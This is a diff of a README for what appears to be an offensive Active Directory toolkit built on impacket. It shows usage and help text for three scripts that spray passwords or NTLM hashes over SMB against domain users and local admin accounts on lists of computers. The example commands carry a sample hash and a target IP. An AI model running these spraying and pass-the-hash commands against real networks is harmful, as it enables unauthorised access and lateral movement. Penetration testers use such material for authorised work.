@@ -7,15 +7,8 @@ This was built using the impacket library
 
 ```
 python domainspray.py -userlist users -hashes :1uca3d1bd1a33geb1b15bab12196r5aa -target-ip 192.168.5.1
-```
-Userlist example
 
-```
-domain\user
-user
-```
 
-```
 Active Directory Spraying Toolkit
 
 optional arguments:
@@ -38,24 +31,20 @@ connection:
                         any domain joined computer or a domain controller
   -port [destination port]
                         Destination port to connect to SMB Server
-
-threads:
-  -threads threads      Number of threads to use, default is 1
 ```
 
 
 ```
 python localspray.py -computerlist ./computers.txt -username administrator -hashes :1uca3d1bd1a33geb1b15bab12196r5aa 
-```
 
-```
-Local Admin Spraying Toolkit
+
+Local User Spraying Toolkit
 
 optional arguments:
   -h, --help            show this help message and exit
 
 authentication:
-  -computerlist userlist
+  -computerlist computerlist
                         List of computers to spray
   -username username    Username
   -password password    Clear-text password
@@ -65,7 +54,27 @@ authentication:
 connection:
   -port [destination port]
                         Destination port to connect to SMB Server
+```
 
-threads:
-  -threads threads      Number of threads to use, default is 1
+
+```
+python adminspray.py -computerlist ./computers.txt -username cube0x0 -hashes :1uca3d1bd1a33geb1b15bab12196r5aa 
+
+
+Discover Local Admin Access Spraying Toolkit
+
+optional arguments:
+  -h, --help            show this help message and exit
+
+authentication:
+  -computerlist computerlist
+                        List of computers to spray
+  -username username    Username
+  -password password    Clear-text password
+  -hashes LMHASH:NTHASH
+                        NTLM hashes, format is LMHASH:NTHASH
+
+connection:
+  -port [destination port]
+                        Destination port to connect to SMB Server
 ```
